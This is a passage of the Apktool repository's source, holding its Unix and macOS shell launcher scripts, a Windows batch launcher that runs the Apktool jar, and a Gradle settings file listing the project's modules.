# If you want DX to have more memory when executing, uncomment the following
# line and adjust the value accordingly. Use "java -X" for a list of options
# you can pass here.
#
javaOpts="-Xmx512M -Dfile.encoding=utf-8"

# Alternatively, this will extract any parameter "-Jxxx" from the command line
# and pass them to Java (instead of to dx). This makes it possible for you to
# add a command-line parameter such as "-JXmx256M" in your ant scripts, for
# example.
while expr "x$1" : 'x-J' >/dev/null; do
    opt=`expr "$1" : '-J\(.*\)'`
    javaOpts="${javaOpts} -${opt}"
    shift
done

if [ "$OSTYPE" = "cygwin" ] ; then
	jarpath=`cygpath -w  "$libdir/$jarfile"`
else
	jarpath="$libdir/$jarfile"
fi

# add current location to path for aapt
PATH=$PATH:`pwd`;
export PATH;
exec java $javaOpts -jar "$jarpath" "$@"

```

`scripts/osx/apktool`:

```
#!/bin/bash
#
# Copyright (C) 2007 The Android Open Source Project
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# This script is a wrapper for smali.jar, so you can simply call "smali",
# instead of java -jar smali.jar. It is heavily based on the "dx" script
# from the Android SDK

# Set up prog to be the path of this script, including following symlinks,
# and set up progdir to be the fully-qualified pathname of its directory.
prog="$0"
while [ -h "${prog}" ]; do
    newProg=`/bin/ls -ld "${prog}"`

    newProg=`expr "${newProg}" : ".* -> \(.*\)$"`
    if expr "x${newProg}" : 'x/' >/dev/null; then
        prog="${newProg}"
    else
        progdir=`dirname "${prog}"`
        prog="${progdir}/${newProg}"
    fi
done
oldwd=`pwd`
progdir=`dirname "${prog}"`
cd "${progdir}"
progdir=`pwd`
prog="${progdir}"/`basename "${prog}"`
cd "${oldwd}"

jarfile=apktool.jar
libdir="$progdir"
if [ ! -r "$libdir/$jarfile" ]
then
    echo `basename "$prog"`": can't find $jarfile"
    exit 1
fi

javaOpts=""

# If you want DX to have more memory when executing, uncomment the following
# line and adjust the value accordingly. Use "java -X" for a list of options
# you can pass here.
#
javaOpts="-Xmx512M -Dfile.encoding=utf-8"

# Alternatively, this will extract any parameter "-Jxxx" from the command line
# and pass them to Java (instead of to dx). This makes it possible for you to
# add a command-line parameter such as "-JXmx256M" in your ant scripts, for
# example.
while expr "x$1" : 'x-J' >/dev/null; do
    opt=`expr "$1" : '-J\(.*\)'`
    javaOpts="${javaOpts} -${opt}"
    shift
done

if [ "$OSTYPE" = "cygwin" ] ; then
	jarpath=`cygpath -w  "$libdir/$jarfile"`
else
	jarpath="$libdir/$jarfile"
fi

# add current location to path for aapt
PATH=$PATH:`pwd`;
export PATH;
exec java $javaOpts -Djava.awt.headless=true -jar "$jarpath" "$@"

```

`scripts/windows/apktool.bat`:

```bat
@echo off
setlocal
set BASENAME=apktool_
chcp 65001 2>nul >nul

set java_exe=java.exe

if defined JAVA_HOME (
set java_exe="%JAVA_HOME%\bin\java.exe"
)

rem Find the highest version .jar available in the same directory as the script
setlocal EnableDelayedExpansion
pushd "%~dp0"
if exist apktool.jar (
    set BASENAME=apktool
    goto skipversioned
)
set max=0
for /f "tokens=1* delims=-_.0" %%A in ('dir /b /a-d %BASENAME%*.jar') do if %%~B gtr !max! set max=%%~nB
:skipversioned
popd
setlocal DisableDelayedExpansion

rem Find out if the commandline is a parameterless .jar or directory, for fast unpack/repack
if "%~1"=="" goto load
if not "%~2"=="" goto load
set ATTR=%~a1
if "%ATTR:~0,1%"=="d" (
    rem Directory, rebuild
    set fastCommand=b
)
if "%ATTR:~0,1%"=="-" if "%~x1"==".apk" (
    rem APK file, unpack
    set fastCommand=d
)

:load
"%java_exe%" -jar -Duser.language=en -Dfile.encoding=UTF8 "%~dp0%BASENAME%%max%.jar" %fastCommand% %*

rem Pause when ran non interactively
for /f "tokens=2" %%# in ("%cmdcmdline%") do if /i "%%#" equ "/c" pause

```

`settings.gradle`:

```gradle
include 'brut.j.common',
        'brut.j.util',
        'brut.j.dir',
        'brut.apktool:apktool-lib',
        'brut.apktool:apktool-cli'
```